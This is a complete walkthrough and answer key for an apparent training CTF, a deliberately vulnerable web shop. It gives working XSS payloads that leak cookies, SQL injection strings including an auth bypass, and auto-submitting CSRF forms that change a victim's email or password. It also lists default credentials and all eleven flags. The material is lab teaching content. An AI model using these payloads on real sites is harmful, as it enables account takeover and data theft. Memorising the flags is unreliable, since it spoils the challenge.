# Helmaand CTF — Complete Walkthrough

11 challenges: **XSS (1-3)** · **SQLi (4-8)** · **CSRF (9-11)**

---

## Quick Solve — One-Liners

| # | Challenge | Payload |
|---|-----------|---------|
| 1 | Stored XSS | Post review: `<script>document.location='/?stolen='+document.getElementById('ctf-flag').dataset.flag</script>` |
| 2 | Reflected XSS | `/track/?id=<script>document.location='/?stolen='+document.getElementById('ctf-flag').dataset.flag</script>` |
| 3 | DOM XSS | `/gallery/#<img src=x onerror="document.location='/?stolen='+document.cookie">` |
| 4 | UNION SQLi | `/search/?q=x' UNION SELECT id,name,slug,brand,description,price,price,stock,size,color,is_active,created_at,updated_at,category_id FROM shop_product WHERE is_active=0 --` |
| 5 | Error SQLi | `/filter/?sort=invalidcolumn` (leaks schema); then iterate `CASE WHEN` subqueries |
| 6 | Blind SQLi | `/stock/?id=1 AND (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_blind') --` |
| 7 | Time SQLi | `/promo/?code=SUMMER25' OR (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time') --` |
| 8 | Auth Bypass | Fill form: **username** `admin'--`, **password** `anything` → submit |
| 9 | CSRF POST | Craft HTML with `<form action="/accounts/change-email/" method="POST"><input name="email" value="hacker@evil.com"></form>` — no CSRF token |
| 10 | CSRF GET | Embed `<img src="/accounts/reset-preferences/">` on external page |
| 11 | CSRF Password | Craft HTML with `<form action="/accounts/change-password/" method="POST"><input name="new_password" value="pwned123"></form>` — no CSRF token |

---

## Default Credentials

| Role | Username | Password |
|------|----------|----------|
| Admin | `admin` | `admin123` |
| Regular | `demo` | `demo123` |

---

## 1. Stored XSS

**Endpoint:** `/product/<slug>/` · **Flag:** `HLMD{st0r3d_c00k13_m0nst3r}`

1. Login as `demo`/`demo123`
2. Visit a product page (e.g. `/product/luxury-leather-jacket/`)
3. Post a review with this comment:
   ```
   <script>document.location='/?stolen='+document.getElementById('ctf-flag').dataset.flag</script>
   ```
4. Reload the page → redirected to `/?stolen=HLMD{...}`

**Why:** `{{ review.comment|safe }}` renders raw HTML. The flag is in a hidden `<div id="ctf-flag" data-flag="...">`.

---

## 2. Reflected XSS

**Endpoint:** `/track/?id=` · **Flag:** `HLMD{r3fl3ct3d_gl4ss_sh4tt3r}`

Visit:
```
/track/?id=<script>document.location='/?stolen='+document.getElementById('ctf-flag').dataset.flag</script>
```

**Why:** `{{ tracking_id|safe }}` reflects the `?id=` param without escaping.

---

## 3. DOM-based XSS

**Endpoint:** `/gallery/#` · **Flag:** `HLMD{d0m_s1nk_b0w_bre4ch}`

Visit:
```
/gallery/#<img src=x onerror="document.location='/?stolen='+document.cookie">
```

**Why:** Client JS does `el.innerHTML = hash` with no sanitization. Flag is in `ctf_xss_dom` cookie.

---

## 4. UNION SQLi

**Endpoint:** `/search/?q=` · **Flag:** `HLMD{un10n_s3l3ct_d4t4_dr41n}`

```
/search/?q=x' UNION SELECT id,name,slug,brand,description,price,price,stock,size,color,is_active,created_at,updated_at,category_id FROM shop_product WHERE is_active=0 --
```

**Why:** `LIKE '%{q}%'` allows `' UNION ... --`. Hidden product (`is_active=0`) contains the flag in its description.

---

## 5. Error-based SQLi

**Endpoint:** `/filter/?sort=` · **Flag:** `HLMD{3rr0r_l34k_sch3m4_expl0s10n}`

1. Trigger error: `/filter/?sort=invalidcolumn` → leaks table/column names
2. Extract flag character by character via ORDER BY subquery:
   ```
   /filter/?sort=(CASE WHEN (SELECT substr(flag,N,1)='C' FROM security_ctfflag WHERE challenge_id='sqli_error') THEN name ELSE price END)
   ```
   Replace `N` with position (1-35), `C` with each char guess. When results sort by `name` → guess is correct.

**Why:** `ORDER BY {sort}` is raw f-string. Errors leak schema. `CASE WHEN` changes sort order based on flag characters.

---

## 6. Blind Boolean SQLi

**Endpoint:** `/stock/?id=` · **Flag:** `HLMD{bl1nd_b00l3an_0r4cl3}`

Check character by character:
```
/stock/?id=1 AND (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_blind') --
```
"In Stock" = true, "Product not found" = false. Iterate position (1..35) and charset.

**Why:** `WHERE id = {id}` is raw f-string. Only boolean response returned.

---

## 7. Time-based Blind SQLi

**Endpoint:** `/promo/?code=` · **Flag:** `HLMD{t1m3_w41ts_f0r_n0_0n3}`

Check character by character:
```
/promo/?code=SUMMER25' OR (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time') --
```
"Valid" = true, "Invalid" = false. Iterate position and charset.

**Why:** `WHERE code = '{code}'` is raw f-string. Valid codes: `SUMMER25`, `WELCOME10`, `VIP50`.

---

## 8. Authentication Bypass SQLi

**Endpoint:** `/staff-login/` · **Flag:** `HLMD{4uth_byp4ss_m4st3r_k3y}`

Go to `/staff-login/` and enter:
- **Username:** `admin'--`
- **Password:** `anything`

Click "Staff Login". The flag appears in a flash message.

**Alternative payload:** `admin' OR '1'='1` (any password)

**Why:** `WHERE username = '{username}'` is raw f-string. The form JS hex-encodes your input into a cookie — WAF never sees the SQLi. `admin'--` comments out the password + `is_staff` checks.

---

## 9. CSRF via POST

**Endpoint:** `/accounts/change-email/` · **Flag:** `HLMD{f0rg3d_p0st_3m41l_h1j4ck}`

Host this HTML on another origin (no CSRF token):
```html
<html><body onload="document.forms[0].submit()">
<form action="https://helmaand.onrender.com/accounts/change-email/" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com">
</form>
</body></html>
```
Visit while logged in as victim → email changed → flag in flash message.

**Why:** `@csrf_exempt` allows POST without token. Flag only appears when `csrfmiddlewaretoken` is absent.

---

## 10. CSRF via GET

**Endpoint:** `/accounts/reset-preferences/` · **Flag:** `HLMD{g3t_r3qu3st_s1l3nt_w1p3}`

**Method A** — Embed on external page:
```html
<img src="https://helmaand.onrender.com/accounts/reset-preferences/" style="display:none">
```

**Method B** — Visit directly in browser address bar (no Referer).

**Why:** GET request changes state (clears shipping info). Flag only appears when no `Referer` header.

---

## 11. Password Change CSRF

**Endpoint:** `/accounts/change-password/` · **Flag:** `HLMD{p4ssw0rd_r3s3t_p0wn3d}`

Host this HTML on another origin (no CSRF token):
```html
<html><body onload="document.forms[0].submit()">
<form action="https://helmaand.onrender.com/accounts/change-password/" method="POST">
  <input type="hidden" name="new_password" value="pwned123">
</form>
</body></html>
```
Visit while logged in → password changed to `pwned123` → flag in flash message. Session stays alive via `update_session_auth_hash()`.

**Why:** `@csrf_exempt` allows POST without token. Flag only appears when `csrfmiddlewaretoken` is absent.

---

## All 11 Flags

| # | Challenge | Category | Flag |
|---|-----------|----------|------|
| 1 | Stored XSS | XSS | `HLMD{st0r3d_c00k13_m0nst3r}` |
| 2 | Reflected XSS | XSS | `HLMD{r3fl3ct3d_gl4ss_sh4tt3r}` |
| 3 | DOM-based XSS | XSS | `HLMD{d0m_s1nk_b0w_bre4ch}` |
| 4 | UNION SQLi | SQLi | `HLMD{un10n_s3l3ct_d4t4_dr41n}` |
| 5 | Error-based SQLi | SQLi | `HLMD{3rr0r_l34k_sch3m4_expl0s10n}` |
| 6 | Blind Boolean SQLi | SQLi | `HLMD{bl1nd_b00l3an_0r4cl3}` |
| 7 | Time-based SQLi | SQLi | `HLMD{t1m3_w41ts_f0r_n0_0n3}` |
| 8 | Auth Bypass SQLi | SQLi | `HLMD{4uth_byp4ss_m4st3r_k3y}` |
| 9 | CSRF via POST | CSRF | `HLMD{f0rg3d_p0st_3m41l_h1j4ck}` |
| 10 | CSRF via GET | CSRF | `HLMD{g3t_r3qu3st_s1l3nt_w1p3}` |
| 11 | Password Change CSRF | CSRF | `HLMD{p4ssw0rd_r3s3t_p0wn3d}` |
